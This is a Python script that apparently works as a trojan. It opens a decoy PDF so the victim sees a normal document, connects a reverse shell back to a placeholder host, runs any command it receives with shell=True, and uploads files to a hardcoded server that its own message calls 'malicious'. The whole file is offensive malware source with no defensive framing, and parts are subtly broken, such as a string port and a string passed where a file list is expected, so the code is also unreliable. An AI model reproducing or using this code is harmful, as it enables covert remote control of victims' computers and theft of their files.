import subprocess
import os
import socket
import shlex
import threading
import sys
import webbrowser
import requests
SERVER_URL = "http://192.168.88.105:2020"
def send_files(args):
    files_to_send = args[1:]
    if not files_to_send:
        print("No files provided to upload.")
        return
    files = {}
    for idx, file_path in enumerate(files_to_send):
        try:
            files[f"files{idx}"] = open(file_path, "rb")
        except Exception as e:
            print(f"Failed to open {file_path}: {e}")
            continue
    try:
        response = requests.post(f"{SERVER_URL}/upload", files=files)
        print("Serve payload: ", response.text)
    except Exception as e:
        print(f"Failed to send files: {e}")
    finally:
        for f in files.values():
            f.close()
def open_pdf():
    print("Open pdf in webborwser....")
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    pdf_path = os.path.join(base_path, "Fake.pdf")
    webbrowser.open(pdf_path)
def connect_back():
    s = socket.socket()
    s.connect(("IP", "PORT"))
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd.startswith("send"):
                send_files(cmd)
                s.send("Files has been sent to your mailicous server")
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
            output = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if result:
                s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
threading.Thread(target=open_pdf).start()
connect_back()